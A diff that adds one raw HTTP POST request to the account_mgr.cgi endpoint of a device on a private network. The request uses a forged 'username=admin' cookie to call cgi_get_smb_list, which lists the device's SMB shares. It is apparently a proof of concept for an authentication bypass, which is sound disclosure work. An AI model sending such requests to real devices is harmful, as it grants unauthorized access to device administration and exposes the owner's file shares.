@@ -1,0 +1,15 @@
+POST /cgi-bin/account_mgr.cgi HTTP/1.1
+Host: 192.168.1.201
+Content-Length: 61
+Accept: application/xml, text/xml, */*; q=0.01
+X-Requested-With: XMLHttpRequest
+Accept-Language: zh-CN
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Origin: http://192.168.1.201
+Referer: http://192.168.1.201/web/management.html?id=account&v=1720428557001
+Accept-Encoding: gzip, deflate, br
+Cookie: username=admin
+Connection: keep-alive
+
+cmd=cgi_get_smb_list&page=1&rp=10&query=&qtype=&f_field=false
